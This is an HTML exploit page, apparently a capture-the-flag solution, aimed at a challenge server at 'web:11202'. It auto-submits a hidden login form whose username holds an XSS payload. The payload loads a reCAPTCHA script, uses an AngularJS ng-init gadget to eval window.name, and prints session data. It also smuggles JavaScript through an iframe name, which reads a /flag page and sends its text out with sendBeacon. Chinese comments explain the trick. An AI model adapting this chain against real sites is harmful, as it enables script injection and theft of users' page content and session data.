<!DOCTYPE html>
<html>
<head>
    <title>Exploit - Single Tab (Iframe)</title>
</head>
<body>
    <h1>Exploit Running (Single Tab Mode)...</h1>
    <br>

    <iframe id="attackFrame" style="width:500px; height:200px;"></iframe>

    <form id="loginForm" action="http://web:11202/login" method="POST">
        <input type="hidden" name="username" value='<script src=https://www.google.com/recaptcha/about/js/main.min.js></script><d ng-init=[].pop.constructor("eval(name)")()>{request.session}'>
        <input type="hidden" name="password" value="testtest">
    </form>

    <script>
        // 定義 Payload
        // 這是要注入到 window.name 的程式碼
        var w = window.open("http://web:11202/flag", "x");
        var payloadCode = "navigator.sendBeacon(`/api/flag/`, new URLSearchParams(`content=` + open(``, `x`).document.body.innerText))";

        // 設定 iframe 攻擊環境
        var frame = document.getElementById('attackFrame');
        var form = document.getElementById('loginForm');

        // 【關鍵技巧】
        // 將 iframe 的 name 設為 Payload 代碼
        // 同時將 form 的 target 也設為這個 Payload 代碼
        // 這樣表單就會提交到 iframe 裡，且該 iframe 的 window.name 就是我們的代碼
        frame.name = payloadCode;
        form.target = payloadCode;

        // 提交表單
        setTimeout(function() {
            form.submit();
        }, 500);
    </script>
</body>
</html>
